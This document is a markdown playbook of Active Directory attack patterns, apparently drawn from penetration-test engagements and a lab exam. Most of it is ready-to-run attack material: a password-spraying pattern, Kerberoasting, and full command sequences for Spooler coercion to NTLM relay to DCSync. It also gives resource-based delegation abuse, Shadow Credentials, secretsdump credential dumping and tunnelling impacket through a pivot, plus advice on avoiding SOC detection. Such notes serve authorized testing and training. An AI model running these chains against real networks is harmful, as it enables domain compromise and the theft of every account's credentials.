# Proven Patterns — Active Directory

Patterns that generalize across AD engagements. Add real engagement lessons here.

## High-Yield Patterns

| Trigger | Technique | Expected Yield |
|---------|-----------|---------------|
| Any AD environment | `certipy find -vulnerable` | ADCS ESC1/ESC4 in ~70% of default deployments |
| Password policy allows Season+Year | Spray `Summer2026!`, `Winter2025!` | At least 1 hit in most domains |
| Kerberoast returns RC4 tickets | Hashcat -m 13100 + rockyou + rules | Service accounts with weak passwords |
| BloodHound shows GenericAll on user | Reset password or set SPN → Kerberoast | Direct privilege escalation |
| SMB signing disabled on member servers | NTLM relay via coercion | SAM dump / code execution |
| Unconstrained delegation computer | Coerce DC + capture TGT | DC impersonation → DCSync |
| SYSVOL readable | Check for GPP passwords (cpassword) | Legacy creds in ~30% of mature domains |
| Service account in DA | Kerberoast that SPN specifically | Single crack = game over |
| LAPS not deployed | Local admin reuse across workstations | Lateral movement via pass-the-hash |
| Web app on domain server | ptest → get shell → dump creds from memory | Domain creds from IIS/service account |

## Anti-Patterns (Things That Waste Time)

- Testing from wrong machine in exam/lab environments — targets may only be reachable from a provided Kali/jumpbox. ALWAYS verify connectivity from the designated attack platform FIRST before spending time on scans/exploits that silently fail.
- Spraying 10+ passwords without checking lockout policy — instant account lockouts
- Trying to crack AES Kerberos tickets — nearly impossible without GPU farm
- Running SharpHound without AV evasion — gets caught and alerts SOC
- Golden ticket before exhausting other paths — overkill and noisy
- Relaying to DC (SMB signing required by default) — always fails on DCs
- Brute-forcing krbtgt — will never work, it's a long random password

## Proven Attack Chain: Spooler Coercion → LDAP Relay → DCSync

**Prerequisites:** Domain user creds + host that DC will authenticate to + LDAP signing disabled

**Chain:**
1. Verify LDAP signing: `ldap3.Connection` bind without signing → if success = relay viable
2. Capture proof: `smbserver.py share /tmp -smb2support` → coerce → verify AUTHENTICATE_MESSAGE
3. Kill smbserver, start relay: `ntlmrelayx.py -t ldap://<DC> --escalate-user <user> -smb2support`
4. Re-trigger coercion: mimikatz `misc::spooler /server:<DC> /connect:<listener>`
5. ntlmrelayx relays DC$ auth → grants DCSync to user
6. DCSync: `secretsdump.py -just-dc DOMAIN/user:pass@<DC>`

**Coercion methods (try in order):** SpoolSample → PetitPotam(EFS) → DFSCoerce → ShadowCoerce

**Failure modes:**
- ntlmrelayx segfault → downgrade to impacket 0.10.0
- No callback → firewall blocking DC outbound SMB
- LDAP signing enforced → try ADCS ESC8 or different path

## Proven Attack Chain: RBCD

**Prerequisites:** Write to target's msDS-AllowedToActOnBehalfOfOtherIdentity + add computer account

**Chain:**
1. `addcomputer.py -computer-name 'ATK$' -computer-pass 'P@ss!' DOMAIN/user:pass`
2. `rbcd.py -delegate-from 'ATK$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass`
3. `getST.py -spn cifs/TARGET -impersonate Administrator DOMAIN/ATK$:P@ss!`
4. `export KRB5CCNAME=Administrator.ccache; secretsdump.py -k -no-pass TARGET`

**Common failure:** "insufficient rights" on step 2 = no write access to target AD object

## Proven Pattern: Relay When Only Target Has Bidirectional SMB

**Problem (SecOps Exam, June 2026):** Spoolss accessible on DC, but:
- DC can only reach .8 (compromised host) on port 445
- .8 already has SMB bound (can't start rogue listener)
- DC can't reach Kali or Linux hosts on 445

**Solutions (try in order):**
1. **Stop Windows SMB on .8** — risky but effective:
   ```cmd
   net stop lanmanserver /y
   :: Start ntlmrelayx listener on .8 (requires uploading binary or Python)
   :: Re-trigger coercion, relay to LDAP on DC
   net start lanmanserver
   ```
2. **Use a non-445 port** — modify SMB service or use `portproxy`:
   ```cmd
   netsh interface portproxy add v4tov4 listenport=8445 connectaddress=<kali> connectport=445
   :: Coerce DC to \\compromised_host:8445 (won't work — SMB clients hardcode 445)
   ```
3. **Shadow Credentials via LDAP directly** (no relay needed):
   ```bash
   # If you have write to DC's AD object via machine account:
   python3 pywhisker.py -d domain -u 'MACHINE$' -H <hash> --target DC$ --action add
   ```
4. **RBCD from machine account** (if PRODSERVER$ can write to DC$ object):
   ```bash
   impacket-rbcd -delegate-from 'PRODSERVER$' -delegate-to 'DC$' -action write \
     -hashes :<machine_hash> 'DOMAIN/PRODSERVER$' -dc-ip <DC>
   ```
5. **Upload relay tool to .8** — use certutil to download ntlmrelayx standalone, stop SMB, relay locally.

**Key lesson:** Map bidirectional connectivity BEFORE planning relay. If only the compromised host can receive DC auth AND that host has SMB bound, you need to either stop its SMB service or find a non-relay path (RBCD, Shadow Creds, ADCS).

## Proven Pattern: Impacket Over SSH Tunnel (Custom Port)

**Problem (SecOps Exam, June 2026):** Target DC only reachable from a Linux pivot host, not from Kali directly. SSH tunnel forwards DC port 445 to localhost:4445, but impacket tools hardcode port 445.

**Solution:** Use impacket Python library directly with `sess_port` parameter:

```python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport

# Connect via tunnel (local port 4445 → target:445)
conn = SMBConnection('TARGET_HOSTNAME', '127.0.0.1', sess_port=4445)
conn.login('USER', '', nthash='<hash>')

# For RPC over named pipe (SAMR, LSARPC, DRSUAPI):
rpctransport = transport.SMBTransport(
    '127.0.0.1', 4445, r'\samr',
    username='USER', password='', nthash='<hash>',
    smb_connection=conn
)
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(<UUID>)
```

**Setting up the tunnel:**
```bash
# On Kali/attacker:
ssh -i <key> -L 4445:<DC_IP>:445 -L 4135:<DC_IP>:135 -N -f user@pivot_host
# Verify:
ss -tlnp | grep 4445
```

**Limitations:**
- `impacket-secretsdump` CLI doesn't support custom ports — use Python directly
- Dynamic RPC ports (49xxx) need individual forwards or SOCKS proxy
- For full access, prefer `sshuttle` or SOCKS proxy over individual port forwards:
  ```bash
  ssh -i <key> -D 1080 -N -f user@pivot_host
  proxychains impacket-secretsdump DOMAIN/user:pass@<DC_IP>
  ```
